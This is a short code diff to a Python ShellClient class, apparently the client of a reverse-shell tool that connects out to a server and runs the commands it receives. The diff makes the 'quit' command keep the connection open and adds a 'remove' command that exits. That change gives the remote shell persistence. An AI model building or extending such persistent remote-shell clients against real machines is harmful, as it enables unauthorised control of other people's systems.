@@ -46,7 +46,6 @@ class ShellClient:
         try:
             self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             self.client_socket.connect((self.host, self.port))
-            self.client_socket.setblocking(True)
 
         except ConnectionRefusedError:
             print("\n[!] Server unavailable. Are you sure it is running?\n")
@@ -75,11 +74,14 @@ class ShellClient:
                 except Exception as e:
                     output = '[-]Could not change directory\n'
 
-            elif args[0] == 'quit':
-
+            elif args[0] == 'remove':
                 # Gracefully close the connection
                 self.disconnect()
-                break
+                sys.exit()
+
+            elif args[0] == 'quit':
+                # Retain this client connection
+                continue
 
             if command_stream:
                 command = ' '.join(args)
@@ -102,5 +104,8 @@ class ShellClient:
 
     def disconnect(self):
         """Gracefully closes client connection to the server"""
-        self.client_socket.shutdown(socket.SHUT_RDWR)
+        try:
+            self.client_socket.shutdown(socket.SHUT_RDWR)
+        except OSError:
+            pass
         self.client_socket.close()
